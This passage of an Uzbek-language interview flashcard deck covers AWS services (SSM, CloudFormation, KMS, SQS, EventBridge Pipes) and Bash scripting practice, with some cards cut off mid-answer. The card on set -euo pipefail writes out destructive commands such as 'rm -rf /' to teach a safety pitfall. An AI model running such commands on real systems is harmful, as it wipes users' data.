Masalan: CloudWatch agent o'rnatilgan va sozlangan, antivirus ishlayapti, domenga qo'shilgan, SSH root login o'chiq.</p><p><b>Muammo:</b> Yangi serverlar to'g'ri sozlanadi, lekin vaqt o'tib kimdir agent'ni o'chiradi yoki konfiguratsiyani o'zgartiradi. Yuzlab serverda bunday drift'ni topish va tuzatish uchun Puppet/Chef server yuritish kerak edi.</p><p><b>Qanday ishlaydi:</b></p><pre>Association:<br>  document: AWS-ConfigureAWSPackage (AmazonCloudWatchAgent, install)<br>  targets:  tag Environment=prod<br>  schedule: rate(30 minutes)<br>  compliance severity: HIGH<br>   v<br>Har 30 daqiqada (va yangi instance target'ga qo'shilganda darhol) qo'llanadi<br>   v<br>Compliance: Association COMPLIANT / NON_COMPLIANT -&gt; Config / Security Hub</pre><p><b>Amalda:</b></p><pre>aws ssm create-association --name AWS-ApplyAnsiblePlaybooks \<br>  --targets Key=tag:Role,Values=web \<br>  --parameters SourceType=S3,SourceInfo='{&quot;path&quot;:&quot;https://s3.amazonaws.com/cfg/web.yml&quot;}',PlaybookFile=web.yml \<br>  --schedule-expression &quot;rate(1 hour)&quot; --max-concurrency 10% --max-errors 5% \<br>  --compliance-severity HIGH<br>aws ssm list-associations<br>aws ssm describe-association-executions --association-id &lt;id&gt;</pre><p><b>Tuzoqlar:</b></p><ul><li>Association xato beradi, lekin hech kim kuzatmaydi — compliance'ni Config/alert'ga ula.</li><li>Juda tez-tez jadval + og'ir playbook — CPU yuki.</li><li>State Manager va boshqa tool (Ansible pull, Chef) bir xil fayl uchun &quot;jang&quot; qiladi — bitta manba.</li></ul><p><b>Senior nuqta:</b> State Manager — agent'siz qo'shimcha infra talab qilmaydigan desired-state tizimi. Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-40989	<p>CloudFormation stack policy nima?</p>	<p><b>Qisqa javob:</b> Stack policy — CloudFormation stack'iga biriktiriladigan JSON hujjat: stack <b>update</b> paytida qaysi resurslarni yangilash (<code>Update:Modify</code>), almashtirish (<code>Update:Replace</code>) yoki o'chirish (<code>Update:Delete</code>) mumkin emasligini belgilaydi. Bir marta qo'yilgach, policy'da ruxsat etilmagan barcha resurslar himoyalanadi (default deny).</p><p><b>Muammo:</b> Template'da RDS'ning xususiyatini (masalan <code>DBInstanceIdentifier</code> yoki engine) o'zgartirish CloudFormation tomonidan <b>replacement</b> (yangi DB yaratish, eskisini o'chirish) deb talqin qilinadi — prod ma'lumot yo'qoladi.</p><p><b>Qanday ishlaydi:</b></p><pre>{&quot;Statement&quot;:[<br>  {&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:&quot;Update:*&quot;,&quot;Principal&quot;:&quot;*&quot;,&quot;Resource&quot;:&quot;*&quot;},<br>  {&quot;Effect&quot;:&quot;Deny&quot;,&quot;Action&quot;:[&quot;Update:Replace&quot;,&quot;Update:Delete&quot;],&quot;Principal&quot;:&quot;*&quot;,<br>   &quot;Resource&quot;:&quot;LogicalResourceId/ProdDatabase&quot;}<br>]}</pre><pre>update-stack -&gt; change set: ProdDatabase  Replacement: True<br>   v stack policy tekshiruvi<br>DENY -&gt; update muvaffaqiyatsiz, stack rollback, DB o'zgarmaydi<br>Ataylab o'zgartirish kerak bo'lsa: --stack-policy-during-update-body (vaqtinchalik override)</pre><p><b>Amalda:</b></p><pre>aws cloudformation set-stack-policy --stack-name prod-db --stack-policy-body file://policy.json<br>aws cloudformation create-change-set --stack-name prod-db --change-set-name c1 --template-body file://t.yml<br>aws cloudformation describe-change-set --stack-name prod-db --change-set-name c1 \<br>  --query 'Changes[].ResourceChange.[LogicalResourceId,Action,Replacement]'</pre><p><b>Bog'liq himoyalar:</b> | Mexanizm | Nimadan himoya | |---|---| | Stack policy | Stack update paytida o'zgartirish/almashtirish | | <code>DeletionPolicy: Retain/Snapshot</code> | Stack yoki resurs o'chirilganda ma'lumot yo'qolishi | | <code>UpdateReplacePolicy</code> | Replacement'da eski resursni saqlash | | Termination protection | Butun stack'ni o'chirish | | RDS deletion protection | Resursning o'zini o'chirish |</p><p><b>Tuzoqlar:</b></p><ul><li>Stack policy'ni stack'ni o'chirishdan himoya deb o'ylash — yo'q, termination protection va DeletionPolicy kerak.</li><li>Change set'ni ko'rmasdan update — &quot;Replacement: True&quot;ni o'tkazib yuborish.</li><li>Policy'ni hech qachon vaqtincha override qilmaslik kerak deb, kerakli o'zgarishni konsoldan qilish (drift).</li></ul><p><b>Senior nuqta:</b> Stateful resurslar (DB, bucket) uchun himoya qatlamlari birga: DeletionPolicy + deletion protection + stack policy + change set review. Ko'p jamoalar stateful resurslarni alohida, kam o'zgaradigan stack'ga ajratadi.</p>	lvl::Senior dom::cloud sec::h16 Cloud_architecture_DR_scenarios

Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-40996	<p>KMS asymmetric keys nima?</p>	<p><b>Qisqa javob:</b> KMS asymmetric keys — KMS'da yaratiladigan <b>RSA, ECC (NIST, secp256k1) yoki SM2</b> public/private kalit juftlari. Private key KMS HSM'dan <b>hech qachon chiqmaydi</b>; public key'ni yuklab olish mumkin. Ishlatilishi: raqamli <b>imzo</b> (<code>Sign</code>/<code>Verify</code>), <b>asimmetrik shifrlash</b> (RSA) va kalit kelishuvi (ECDH, <code>DeriveSharedSecret</code>).</p><p><b>Muammo:</b> Kod imzolash, JWT imzolash, hujjat yaxlitligi yoki AWS'dan tashqaridagi tomon sizga shifrlangan ma'lumot yuborishi kerak — lekin private key'ni serverda faylda saqlash xavfli va auditlanmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>Imzo:<br>  App -&gt; KMS Sign(KeyId, digest, ECDSA_SHA_256) -&gt; imzo<br>  Tekshiruvchi (AWS tashqarisida): public key bilan lokal Verify (KMS'siz)<br><br>Shifrlash:<br>  Tashqi tomon: public key (yuklab olingan) bilan RSA-OAEP shifrlaydi<br>  App -&gt; KMS Decrypt(ciphertext) -&gt; plaintext   (CloudTrail'da audit)</pre><p><b>Amalda:</b></p><pre>aws kms create-key --key-spec ECC_NIST_P256 --key-usage SIGN_VERIFY --description &quot;JWT signing&quot;<br>aws kms get-public-key --key-id alias/jwt --query PublicKey --output text | base64 -d &gt; pub.der<br>aws kms sign --key-id alias/jwt --message fileb://digest.bin --message-type DIGEST \<br>  --signing-algorithm ECDSA_SHA_256 --query Signature --output text</pre><p><b>Simmetrik bilan farq:</b> | | Simmetrik (AES) | Asimmetrik | |---|---|---| | Tashqarida ishlatish | Yo'q (faqat KMS orqali) | Public key — istalgan joyda | | Imzo | HMAC kalitlari | Bor | | Envelope encryption | Asosiy usul | Kam ishlatiladi | | Avtomatik rotation | Bor | Yo'q (qo'lda yangi kalit) |</p><p><b>Tuzoqlar:</b></p><ul><li>Asimmetrik shifrlash bilan katta ma'lumot — RSA hajm limiti; envelope encryption ishlat.</li><li>Avtomatik rotation yo'q — kalitni almashtirish rejasi (JWKS'da bir nechta <code>kid</code>) oldindan bo'lsin.</li><li>Har JWT uchun KMS <code>Sign</code> — yuqori RPS'da throttling va latency; quota'ni hisobla.</li></ul><p><b>Senior nuqta:</b> KMS bilan imzolash private key oqib ketish xavfini yo'qotadi va har imzo audit qilinadi. Yuqori hajmda esa KMS'da saqlangan kalit bilan qisqa muddatli imzolovchi kalitlarni chiqarish (key hierarchy) muvozanat beradi.</p>	lvl::Senior dom::cloud sec::h16 Cloud_architecture_DR_scenarios
Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-40997	<p>SQS deduplication ID nima?</p>	<p><b>Qisqa javob:</b> SQS <b>FIFO</b> navbatida <code>MessageDeduplicationId</code> — <b>5 daqiqalik</b> deduplikatsiya oynasi ichida bir xil ID bilan yuborilgan takroriy xabarlarni SQS qabul qiladi, lekin yetkazmaydi. Yoki <b>content-based deduplication</b> yoqilsa, ID xabar body'sining SHA-256 hash'idan avtomatik olinadi.</p><p><b>Muammo:</b> Producer xabar yubordi, tarmoq uzildi, javob kelmadi — producer qayta yuboradi. Natija: navbatda bir xil buyurtma ikki marta, mijozdan ikki marta pul yechiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>t=0s    Send(body=order-77, DedupId=&quot;order-77&quot;)  -&gt; qabul, navbatga<br>t=3s    Send(body=order-77, DedupId=&quot;order-77&quot;)  -&gt; qabul (200 OK), lekin NAVBATGA QO'SHILMAYDI<br>t=6min  Send(..., DedupId=&quot;order-77&quot;)            -&gt; oyna tugagan -&gt; yangi xabar sifatida!<br>MessageGroupId: tartib va parallelizm birligi (har group ichida qat'iy tartib)</pre><p><b>Amalda:</b></p><pre>sqs.send_message(QueueUrl=q_fifo, MessageBody=json.dumps(order),<br>                 MessageGroupId=f&quot;customer-{order['customer_id']}&quot;,<br>                 MessageDeduplicationId=f&quot;order-{order['id']}&quot;)</pre><pre>aws sqs create-queue --queue-name orders.fifo \<br>  --attributes FifoQueue=true,ContentBasedDeduplication=false,DeduplicationScope=messageGroup,FifoThroughputLimit=perMessageGroupId</pre><p>High throughput FIFO rejimi (<code>perMessageGroupId</code>) bilan ko'p group'larda yuqori TPS.</p><p><b>Tuzoqlar:</b></p><ul><li>Dedup faqat <b>producer tomonida</b> va 5 daqiqa ichida — consumer qayta ishlashi (visibility timeout tugashi) baribir dublikat beradi; consumer idempotent bo'lishi shart.</li><li>Content-based dedup + body'da timestamp — har xabar &quot;boshqacha&quot;, dedup ishlamaydi.</li><li>Bitta <code>MessageGroupId</code> hamma xabar uchun — parallelizm yo'q, throughput juda past.</li></ul><p><b>Senior nuqta:</b> End-to-end exactly-once effekt uchun uch qatlam: producer dedup ID, broker dedup, consumer'da idempotency key (DB unique constraint). SQS dedup faqat birinchisini qisqa oynada hal qiladi.</p>	lvl::Senior dom::cloud sec::h16 Cloud_architecture_DR_scenarios
Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-40998	<p>EventBridge Pipes nima?</p>	<p><b>Qisqa javob:</b> EventBridge Pipes — <b>bitta manbadan bitta target'ga</b> point-to-point integratsiya: source (SQS, Kinesis, DynamoDB Streams, MSK/Kafka, MQ) -&gt; ixtiyoriy <b>filter</b> -&gt; ixtiyoriy <b>enrichment</b> (Lambda, Step Functions, API Gateway, API destination) -&gt; <b>target</b> (14+ servis: Step Functions, EventBridge bus, SQS, Lambda, ECS task, Kinesis...). Glue Lambda yozmasdan, batch, retry va DLQ boshqaruvi bilan.</p><p><b>Muammo:</b> &quot;DynamoDB'da yangi buyurtma bo'lsa, faqat <code>status=PAID</code> bo'lganlarini olib, mijoz ma'lumoti bilan boyitib, Step Functions'ni ishga tushir.&quot; Buning uchun odatda polling, filtr, chaqiruv va xato boshqaruvi uchun Lambda yoziladi va yuritiladi.</p><p><b>Qanday ishlaydi:</b></p><pre>Source: DynamoDB Stream (orders)<br>   v  batch, starting position<br>Filter: {&quot;dynamodb&quot;:{&quot;NewImage&quot;:{&quot;status&quot;:{&quot;S&quot;:[&quot;PAID&quot;]}}}}    (filtrlanganlar uchun to'lov yo'q)<br>   v<br>Enrichment: API destination GET /customers/{id}  (sinxron)<br>   v  input transformer<br>Target: Step Functions (fulfillment workflow)<br>Xato: retry + DLQ (SQS)</pre><p>Pipes vs Rules: Rule — bus'dagi ko'p event'ni ko'p target'ga (fan-out); Pipe — polling talab qiladigan manbadan bitta target'ga, tartib va batch bilan.</p><p><b>Amalda:</b></p><pre>aws pipes create-pipe --name paid-orders \<br>  --source arn:aws:dynamodb:...:table/orders/stream/2026... \<br>  --source-parameters '{&quot;DynamoDBStreamParameters&quot;:{&quot;StartingPosition&quot;:&quot;LATEST&quot;,&quot;BatchSize&quot;:10},<br>    &quot;FilterCriteria&quot;:{&quot;Filters&quot;:[{&quot;Pattern&quot;:&quot;{\&quot;dynamodb\&quot;:{\&quot;NewImage\&quot;:{\&quot;status\&quot;:{\&quot;S\&quot;:[\&quot;PAID\&quot;]}}}}&quot;}]}}' \<br>  --enrichment arn:aws:lambda:...:function:add-customer \<br>  --target arn:aws:states:...:stateMachine:fulfillment --role-arn arn:aws:iam::111:role/pipe</pre><p><b>Tuzoqlar:</b></p><ul><li>Filter pattern manba event formatiga mos emas (masalan SQS'da <code>body</code> JSON string) — hech narsa o'tmaydi.</li><li>Enrichment sekin yoki yiqiladi — butun pipe throughput'i tushadi; timeout va retry'ni sozla.</li><li>Murakkab logikani enrichment Lambda'ga yig'ish — yana &quot;glue kod&quot;ga qaytish.</li></ul><p><b>Senior nuqta:</b> Pipes integratsiya kodini konfiguratsiyaga aylantiradi — kamroq kod, kamroq bug. Lekin biznes logika qayerda yashashini aniq ajrat: transport va routing — Pipes'da, qaror — servis kodida.</p>	lvl::Senior dom::cloud sec::h16 Cloud_architecture_DR_scenarios
Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-40999	<p>FinOps'da cost allocation tag'lar nima?</p>	<p><b>Qisqa javob:</b> Cost allocation tag'lar — resurslarga qo'yilgan tag'lar (<code>Environment</code>, <code>Owner</code>, <code>CostCenter</code>, <code>Project</code>, <code>Service</code>) <b>Billing konsolida aktivlashtirilgandan keyin</b> Cost Explorer, CUR va Budgets'da xarajatni guruhlash o'lchoviga aylanadi. Interview Drill::Cloud::H16 Cloud architecture & DR scenarios	idrill-41000	<p>Well-Architected Sustainability ustuni nima?</p>	<p><b>Qisqa javob:</b> Sustainability — Well-Architected'ning oltinchi ustuni (2021): cloud workload'ning <b>atrof-muhitga ta'sirini</b> (energiya, uglerod) kamaytirish. Asosiy g'oya: kamroq resurs bilan bir xil biznes natija — yuqori utilization, keraksiz ishni yo'qotish, samarali hardware (Graviton, zamonaviy instance'lar), ma'lumot lifecycle'i va to'g'ri region tanlovi. AWS bu ustunda <b>shared responsibility</b>: AWS — &quot;cloud'ning&quot; barqarorligi, siz — &quot;cloud'dagi&quot; barqarorlik.</p><p><b>Muammo:</b> Kechalari bo'sh turgan dev muhitlar, 10% CPU'dagi katta instance'lar, hech kim o'qimaydigan petabaytlab eski log'lar — bular ham pul, ham energiya isrofi.</p><p><b>Dizayn tamoyillari va amaliyot:</b></p><pre>1. Ta'sirni tushun      -&gt; Customer Carbon Footprint Tool, metrikalar (per request kWh/CO2)<br>2. Maqsad qo'y          -&gt; &quot;1000 so'rov uchun vCPU-soat&quot; ni kamaytirish<br>3. Utilization'ni oshir -&gt; rightsizing, autoscaling, Karpenter consolidation, serverless<br>4. Samarali tech        -&gt; Graviton (~60% gacha kam energiya bir xil ishda), yangi avlod instance<br>5. Managed servislar    -&gt; umumiy infra yuqori utilization bilan<br>6. Downstream ta'sir    -&gt; klientga kamroq ma'lumot (siqish, cache), kamroq qayta hisoblash<br>Ma'lumot: lifecycle (S3 Glacier, o'chirish), dublikatlarni yo'qotish<br>Region: qayta tiklanadigan energiya ulushi yuqori region (latency/rezidentlik imkon bersa)</pre><p><b>Amalda:</b></p><pre># Dev muhitni ish vaqtidan tashqari o'chirish (EventBridge Scheduler)<br>aws scheduler create-schedule --name dev-stop --schedule-expression &quot;cron(0 20 ? * MON-FRI *)&quot; \<br>  --target '{&quot;Arn&quot;:&quot;arn:aws:scheduler:::aws-sdk:ecs:updateService&quot;,&quot;RoleArn&quot;:&quot;...&quot;,&quot;Input&quot;:&quot;{\&quot;Cluster\&quot;:\&quot;dev\&quot;,\&quot;Service\&quot;:\&quot;api\&quot;,\&quot;DesiredCount\&quot;:0}&quot;}' \<br>  --flexible-time-window Mode=OFF</pre><p><b>Tuzoqlar:</b></p><ul><li>Sustainability'ni alohida &quot;yashil loyiha&quot; deb, cost optimization'dan ajratish — ular ko'pincha bir xil harakatlar.</li><li>Faqat hardware'ga e'tibor — eng katta isrof odatda bo'sh resurslar va keraksiz ma'lumot.</li><li>O'lchovsiz maqsadlar — &quot;yashilroq bo'lamiz&quot; o'rniga proxy metrika (vCPU-soat, GB-oy per tranzaksiya).</li></ul><p><b>Senior nuqta:</b> Amalda sustainability va xarajat optimizatsiyasi 80% bir-biriga mos keladi: utilization'ni oshirish ikkalasini ham yaxshilaydi. Uni engineering KPI'lariga (unit economics) qo'shish eng samarali yo'l.</p>	lvl::Senior dom::cloud sec::h16 Cloud_architecture_DR_scenarios
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40001	<p>Nega <code>set -euo pipefail</code> production Bash skriptlarda &quot;oltin standart&quot; hisoblanadi?</p>	<p><b>Qisqa javob:</b> <code>set -euo pipefail</code> Bash'ning &quot;jim davom etish&quot; odatini o'chiradi: xato bo'lsa to'xtaydi (<code>-e</code>), aniqlanmagan o'zgaruvchida yiqiladi (<code>-u</code>) va pipeline ichidagi xatoni yashirmaydi (<code>pipefail</code>). Natijada skript yarim bajarilgan holatda zarar keltirmaydi.</p><p><b>Muammo:</b> Default Bash xato bo'lsa ham keyingi qatorga o'tadi. Masalan <code>cd /app/releases</code> muvaffaqiyatsiz bo'lsa, keyingi <code>rm -rf *</code> joriy papkada (balki <code>/</code>) ishlaydi. <code>$BACKUP_DIR</code> da typo bo'lsa, bo'sh string bo'lib <code>rm -rf &quot;$BACKUP_DIR/&quot;</code> -&gt; <code>rm -rf /</code> ga aylanadi. <code>pg_dump db | gzip &gt; dump.gz</code> da <code>pg_dump</code> yiqilsa ham <code>gzip</code> 0 qaytaradi — bo'sh backup &quot;muvaffaqiyatli&quot; deb hisoblanadi.</p><p><b>Qanday ishlaydi:</b></p><pre>-e          : cmd -&gt; exit != 0  -&gt; skript darhol chiqadi<br>-u          : $UNDEF            -&gt; &quot;unbound variable&quot; xato, chiqadi<br>-o pipefail : a | b | c         -&gt; status = oxirgi NOL BO'LMAGAN status<br>              (pipefail'siz status = faqat c ning statusi)</pre><p><b>Amalda:</b></p><pre>#!/usr/bin/env bash<br>set -euo pipefail<br>IFS=$'\n\t'                     # word splitting'ni xavfsizroq qiladi<br><br>pg_dump &quot;$DB_NAME&quot; | gzip &gt; &quot;/backup/${DB_NAME}.sql.gz&quot;<br>echo &quot;backup OK&quot;                # pg_dump yiqilsa bu qator ishlamaydi<br><br># Kutilgan xatoga ruxsat berish:<br>grep -q &quot;pattern&quot; file || true<br>count=$(grep -c ERROR app.log || true)</pre><p><b>Tuzoqlar:</b></p><ul><li><code>-e</code> <code>if</code>, <code>while</code>, <code>&amp;&amp;</code>/<code>||</code> ichidagi buyruqlarga, va funksiya <code>if</code> ichida chaqirilsa uning ichiga ta'sir qilmaydi — bu &quot;yashirin&quot; holatlar bor.</li><li><code>local var=$(cmd)</code> — <code>local</code> 0 qaytaradi va <code>cmd</code> xatosi yo'qoladi. Ikkiga bo'ling: <code>local var; var=$(cmd)</code>.</li><li><code>grep</code> hech narsa topmasa 1 qaytaradi — <code>-e</code> bilan skript kutilmaganda to'xtaydi.</li><li><code>-u</code> bilan ixtiyoriy o'zgaruvchilarni <code>${VAR:-}</code> bilan o'qing.</li></ul><p><b>Senior nuqta:</b> <code>set -euo pipefail</code> — xavfsizlik to'ri, lekin to'liq kafolat emas. Uni <code>trap ... ERR</code> (qaysi qatorda yiqilganini log qilish) va <code>shellcheck</code> bilan birga ishlating; murakkab mantiq (100+ qator) bo'lsa Python'ga o'tish ko'pincha arzonroq.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40002	<p>Bash'da <code>trap</code> bilan cleanup va signal ushlash qanday qilinadi?</p>	<p><b>Qisqa javob:</b> <code>trap 'buyruq' SIGNAL...</code> — skript tugaganda (<code>EXIT</code>) yoki signal kelganda (<code>INT</code>, <code>TERM</code>, <code>HUP</code>) bajariladigan handler ro'yxatdan o'tkazadi. Asosan vaqtinchalik fayl, lock va fon jarayonlarni tozalash uchun.</p><p><b>Muammo:</b> Deploy skript <code>/tmp</code> ga 2 GB arxiv ochdi, keyin xato bo'ldi yoki operator <code>Ctrl+C</code> bosdi. Tozalash qatori skript oxirida edi — u hech qachon bajarilmaydi. Disk to'ladi, lock fayl qoladi va keyingi cron ishga tushmaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>skript ishlayapti<br>   |-- normal tugadi ------------&gt; EXIT trap<br>   |-- set -e xato bilan chiqdi -&gt; EXIT trap<br>   |-- Ctrl+C (SIGINT) ---------&gt; INT trap -&gt; exit -&gt; EXIT trap<br>   |-- kill (SIGTERM) ----------&gt; TERM trap -&gt; exit -&gt; EXIT trap<br>   |-- kill -9 (SIGKILL) -------&gt; hech narsa (ushlab bo'lmaydi)</pre><p><b>Amalda:</b></p><pre>#!/usr/bin/env bash<br>set -euo pipefail<br><br>TEMP_DIR=$(mktemp -d /tmp/deploy_XXXXXX)<br><br>cleanup() {<br>    local rc=$?                     # birinchi qator — exit kodni saqla<br>    rm -rf &quot;$TEMP_DIR&quot;<br>    [[ -n &quot;${BG_PID:-}&quot; ]] &amp;&amp; kill &quot;$BG_PID&quot; 2&gt;/dev/null || true<br>    echo &quot;[INFO] cleanup tugadi (rc=$rc)&quot; &gt;&amp;2<br>    exit &quot;$rc&quot;<br>}<br>trap cleanup EXIT<br>trap 'exit 130' INT                 # 128 + 2<br>trap 'exit 143' TERM                # 128 + 15<br>trap 'echo &quot;[ERR] qator $LINENO: $BASH_COMMAND&quot; &gt;&amp;2' ERR<br><br>tar -xzf release.tgz -C &quot;$TEMP_DIR&quot;</pre><p><code>trap -p</code> — o'rnatilgan trap'larni ko'rsatadi; <code>trap - EXIT</code> — o'chiradi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>trap cleanup EXIT INT TERM</code> — <code>INT</code> da cleanup chaqiriladi, keyin skript davom etadi va <code>EXIT</code> da yana chaqiriladi (ikki marta). Signal'da faqat <code>exit</code> qiling, tozalashni <code>EXIT</code> ga qoldiring.</li><li><code>trap &quot;rm -rf $DIR&quot; EXIT</code> — qo'sh tirnoqda <code>$DIR</code> trap o'rnatilgan paytda ochiladi; bitta tirnoq ishlating.</li><li><code>SIGKILL</code> va OOM killer'ni trap ushlay olmaydi — cleanup'ga 100% tayanmang.</li></ul><p><b>Senior nuqta:</b> Kubernetes pod'da <code>SIGTERM</code> keladi va <code>terminationGracePeriodSeconds</code> (default 30s) dan keyin <code>SIGKILL</code>. Entrypoint skriptda <code>TERM</code> ni ushlab bola jarayonga uzating (yoki <code>exec app</code> qiling) — aks holda graceful shutdown bo'lmaydi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40003	<p>Bash'da single quote <code>' '</code> va double quote <code>&quot; &quot;</code> farqi.</p>	<p><b>Qisqa javob:</b> Single quote (<code>'...'</code>) ichida hamma narsa literal — <code>$VAR</code>, <code>$(cmd)</code>, <code>\</code> ishlamaydi. Double quote (<code>&quot;...&quot;</code>) ichida <code>$VAR</code>, <code>$(cmd)</code>, <code>$((...))</code> ochiladi, lekin word splitting va globbing bo'lmaydi.</p><p><b>Muammo:</b> <code>echo 'Salom $USER'</code> -&gt; <code>Salom $USER</code> chiqadi (kutilgan <code>Salom ali</code> emas). Teskarisi: SSH orqali masofaga buyruq yuborganda <code>ssh host &quot;echo $HOME&quot;</code> sizning lokal <code>$HOME</code> ingizni yuboradi, masofaniki emas.</p><p><b>Qanday ishlaydi:</b></p><pre>            $VAR  $(cmd)  \n,\&quot;  *glob  word split<br>'...'        yo'q   yo'q   yo'q   yo'q    yo'q<br>&quot;...&quot;        ha     ha     qisman yo'q    yo'q<br>tirnoqsiz    ha     ha     ha     ha      HA (xavfli)<br>$'...'       yo'q   yo'q   ha (\n,\t ANSI-C)</pre><p><b>Amalda:</b></p><pre>name=&quot;Ali Vali&quot;<br>echo '$name'            # $name<br>echo &quot;$name&quot;            # Ali Vali<br>echo &quot;Narx: \$5&quot;        # Narx: $5<br>echo $'qator1\nqator2'  # haqiqiy newline<br><br># SSH: lokalda ochilsin vs masofada ochilsin<br>ssh web1 &quot;echo $HOSTNAME&quot;     # lokal hostname<br>ssh web1 'echo $HOSTNAME'     # web1 ning hostname'i<br><br># awk/jq dasturlari doim single quote ichida<br>awk '{print $1}' access.log<br>jq -r '.items[].name' data.json<br><br># Single quote ichida single quote:<br>echo 'It'\''s ok'       # It's ok</pre><p><b>Tuzoqlar:</b></p><ul><li><code>awk &quot;{print $1}&quot;</code> — Bash <code>$1</code> ni skript argumenti bilan almashtiradi; awk kodi har doim <code>'...'</code> da.</li><li><code>grep &quot;$pattern&quot;</code> to'g'ri, lekin <code>grep '$pattern'</code> literal <code>$pattern</code> qidiradi.</li><li>Single quote ichida escape yo'q: <code>'\''</code> hiylasi yoki <code>$'...'</code> kerak.</li></ul><p><b>Senior nuqta:</b> Qoida sodda: kengaytirish kerak bo'lsa <code>&quot;...&quot;</code>, kerak bo'lmasa <code>'...'</code>, tirnoqsiz — deyarli hech qachon. Boshqa tilga (awk, jq, SQL, SSH) kod uzatganda kim kengaytirishini (lokal shell yoki masofa) aniq o'ylang.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40004	<p>Bash'da <code>jq</code> bilan JSON qanday parse va filter qilinadi?</p>	<p><b>Qisqa javob:</b> <code>jq</code> — JSON uchun <code>sed/awk</code>. U JSON'ni o'qib, filter ifodasi (<code>.key</code>, <code>.[]</code>, <code>select()</code>, <code>map()</code>) bo'yicha qism ajratadi yoki yangi JSON yasaydi. <code>-r</code> — tirnoqsiz raw string chiqaradi, skriptlar uchun kerak.</p><p><b>Muammo:</b> <code>kubectl</code>, <code>aws</code>, <code>gh</code>, <code>curl</code> API'lari JSON qaytaradi. <code>grep</code>/<code>awk</code> bilan JSON parse qilish mo'rt — format bir oz o'zgarsa skript buziladi. <code>jq</code> struktura bo'yicha ishlaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>JSON kirish -&gt; filter pipeline -&gt; chiqish<br>.items[]            : massivni elementlarga yoyadi (stream)<br>| select(cond)      : shartga mos kelmaganini tashlaydi<br>| .metadata.name    : maydonni oladi<br>-r                  : &quot;nginx&quot; emas, nginx chiqaradi</pre><p><b>Amalda:</b></p><pre># 1. Running pod nomlari<br>kubectl get pods -n prod -o json | jq -r \<br>  '.items[] | select(.status.phase==&quot;Running&quot;) | .metadata.name'<br><br># 2. Ichki maydon, yo'q bo'lsa default<br>echo '{&quot;db&quot;:{&quot;host&quot;:&quot;10.0.0.1&quot;}}' | jq -r '.db.host // &quot;localhost&quot;'<br><br># 3. Bir nechta maydon -&gt; TSV<br>aws ec2 describe-instances | jq -r \<br>  '.Reservations[].Instances[] | [.InstanceId, .State.Name] | @tsv'<br><br># 4. Xavfsiz JSON yaratish (tirnoq/escape'ni jq hal qiladi)<br>jq -n --arg env &quot;prod&quot; --arg ver &quot;1.2.0&quot; --argjson n 3 \<br>  '{environment:$env, version:$ver, replicas:$n}'<br><br># 5. Faylni o'zgartirish<br>jq '.replicas = 5' cfg.json &gt; cfg.tmp &amp;&amp; mv cfg.tmp cfg.json<br><br># 6. Hisoblash<br>jq '[.items[] | select(.status.phase!=&quot;Running&quot;)] | length' pods.json</pre><p><b>Tuzoqlar:</b></p><ul><li><code>-r</code> siz natija <code>&quot;nginx&quot;</code> (tirnoq bilan) bo'ladi — keyingi buyruqqa noto'g'ri uzatiladi.</li><li>JSON'ni string birlashtirib yasash (<code>&quot;{\&quot;v\&quot;:\&quot;$VAR\&quot;}&quot;</code>) — <code>$VAR</code> da tirnoq bo'lsa JSON buziladi; <code>--arg</code> ishlating.</li><li><code>jq . f &gt; f</code> — faylni bo'shatib yuboradi; vaqtinchalik faylga yozib <code>mv</code> qiling.</li><li>Maydon yo'q bo'lsa <code>null</code> qaytadi, xato emas; tekshirish uchun <code>-e</code> flag (null/false da exit 1).</li></ul><p><b>Senior nuqta:</b> <code>kubectl ... -o jsonpath</code> yoki <code>aws --query</code> (JMESPath) ko'pincha <code>jq</code> siz ishlaydi — bitta tool kamroq dependency. Lekin murakkab transformatsiya uchun <code>jq</code> standart; CI image'larga oldindan o'rnating.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40005	<p>CLI'da YAML fayllarni <code>yq</code> bilan qanday xavfsiz o'zgartirasiz?</p>	<p><b>Qisqa javob:</b> <code>yq</code> (mikefarah, Go versiyasi v4) YAML'ni <code>jq</code> uslubidagi ifodalar bilan o'qiydi va <code>-i</code> bilan joyida o'zgartiradi — izohlar va tartibni imkon qadar saqlaydi. <code>sed</code> bilan YAML tahrirlash indent va kontekstni bilmagani uchun xavfli.</p><p><b>Muammo:</b> CI'da har build'da <code>deployment.yaml</code> dagi image tag'ini almashtirish kerak. <code>sed -i 's/image: .*/image: app:v2/'</code> — fayldagi BARCHA <code>image:</code> qatorlarini (sidecar ham) o'zgartiradi. <code>yq</code> aniq yo'l bo'yicha ishlaydi.</p><p><b>Qanday ishlaydi:</b></p><pre>deployment.yaml -&gt; yq parse -&gt; AST (yo'l: .spec.template...) -&gt; o'zgartir -&gt; yoz</pre><p>Diqqat: ikkita turli <code>yq</code> bor — Python <code>yq</code> (jq wrapper, kiwigo) va Go <code>yq</code> (mikefarah). Sintaksis farq qiladi; quyidagilar Go v4 uchun. <code>yq --version</code> bilan tekshiring.</p><p><b>Amalda:</b></p><pre># O'qish (v4 da 'eval' ixtiyoriy)<br>yq '.spec.template.spec.containers[0].image' deployment.yaml<br><br># Joyida o'zgartirish<br>yq -i '.spec.replicas = 5' deployment.yaml<br><br># Env o'zgaruvchidan xavfsiz qiymat<br>TAG=v2.3.1 yq -i \<br>  '(.spec.template.spec.containers[] | select(.name==&quot;app&quot;)).image = &quot;repo/app:&quot; + strenv(TAG)' \<br>  deployment.yaml<br><br># Multi-document fayl (--- bilan ajratilgan)<br>yq 'select(.kind==&quot;Service&quot;) | 